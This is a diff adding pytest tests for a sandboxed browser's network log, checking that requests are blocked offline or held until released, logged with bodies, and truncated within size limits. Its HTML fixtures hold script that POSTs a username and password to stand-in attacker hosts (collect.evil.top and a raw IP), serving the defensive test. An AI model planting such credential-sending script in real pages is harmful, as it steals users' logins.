@@ -17,6 +17,7 @@ import pytest
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
+import netlog  # noqa: E402
 import nik_browser  # noqa: E402
 import server  # noqa: E402
 
@@ -108,3 +109,71 @@ def test_server_requires_the_token(chromium, monkeypatch):
     with urllib.request.urlopen(request, timeout=30) as response:
         assert response.status == 200
     httpd.shutdown()
+
+
+# --------------------------------------------------------------------------- #
+# Network log                                                                 #
+# --------------------------------------------------------------------------- #
+FORM_PAGE = b"""<!doctype html><title>Login</title><body>
+<img src="https://cdn.evil.top/logo.png">
+<script>
+fetch('https://collect.evil.top/api/login', {method: 'POST', headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({user: 'mario', pass: 'Winter2026'})}).catch(() => {});
+</script></body>"""
+# A public address that needs no DNS: the submission is held before any connection.
+HELD_PAGE = b"""<!doctype html><title>Held</title><body><script>
+fetch('https://93.184.216.34/collect.php', {method: 'POST', body: 'pw=Winter2026'}).catch(() => {});
+</script></body>"""
+
+
+def _entries(chromium, session_id, owner="alice", bodies=True):
+    return chromium.network(session_id, owner, 0, bodies)["entries"]
+
+
+def test_offline_log_keeps_refused_requests_and_their_bodies(chromium):
+    state = chromium.open("alice", network=False, html=FORM_PAGE)
+    assert state["log"]["blocked"] >= 2
+    entries = _entries(chromium, state["id"])
+    page = next(e for e in entries if e["state"] == "local")
+    assert base64.b64decode(page["response"]["body"]).startswith(b"<!doctype html>")
+    post = next(e for e in entries if e["method"] == "POST")
+    assert post["state"] == "blocked" and post["reason"] == "no network in this session"
+    assert json.loads(base64.b64decode(post["request"]["body"])) == {"user": "mario", "pass": "Winter2026"}
+    image = next(e for e in entries if e["url"].endswith("logo.png"))
+    assert image["state"] == "blocked" and image["resourceType"] == "image"
+    # The light list leaves the bodies out; a cursor returns only what changed.
+    light = _entries(chromium, state["id"], bodies=False)
+    assert all("body" not in (e.get("request") or {}) for e in light)
+    cursor = chromium.network(state["id"], "alice", 0, False)["cursor"]
+    assert chromium.network(state["id"], "alice", cursor, True)["entries"] == []
+    with pytest.raises(nik_browser.BrowserError):
+        chromium.network(state["id"], "mallory")
+    chromium.close(state["id"], "alice")
+    # Still readable after the session closed.
+    after = chromium.network(state["id"], "alice", 0, False)
+    assert after["closed"] and after["counts"]["requests"] == len(entries)
+
+
+def test_network_session_holds_submissions_until_released(chromium):
+    state = chromium.open("alice", network=True, html=HELD_PAGE)
+    held = next(e for e in _entries(chromium, state["id"]) if e["method"] == "POST")
+    assert held["state"] == "held" and base64.b64decode(held["request"]["body"]) == b"pw=Winter2026"
+    assert state["log"]["held"] == 1 and state["releasePosts"] is False
+    released = chromium.act(state["id"], "alice", {"type": "policy", "releasePosts": True})
+    assert released["releasePosts"] is True
+    chromium.close(state["id"], "alice")
+    offline = chromium.open("alice", network=False, html=HELD_PAGE)
+    with pytest.raises(nik_browser.BrowserError):
+        chromium.act(offline["id"], "alice", {"type": "policy", "releasePosts": True})
+    chromium.close(offline["id"], "alice")
+
+
+def test_bodies_are_kept_within_the_limits(monkeypatch):
+    log = netlog.NetworkLog()
+    monkeypatch.setattr(netlog, "BODY_MAX", 10)
+    monkeypatch.setattr(netlog, "SESSION_MAX", 15)
+    assert base64.b64decode(log.body(b"0123456789")["body"]) == b"0123456789"
+    big = log.body(b"x" * 11)
+    assert big["bodyTruncated"] and "body" not in big and big["bodySize"] == 11 and len(big["bodySha256"]) == 64
+    assert log.body(b"123456")["bodyTruncated"]  # the session budget (15) is spent
+    assert netlog.timing({"requestStart": 1, "responseStart": 21, "responseEnd": 30})["wait"] == 20
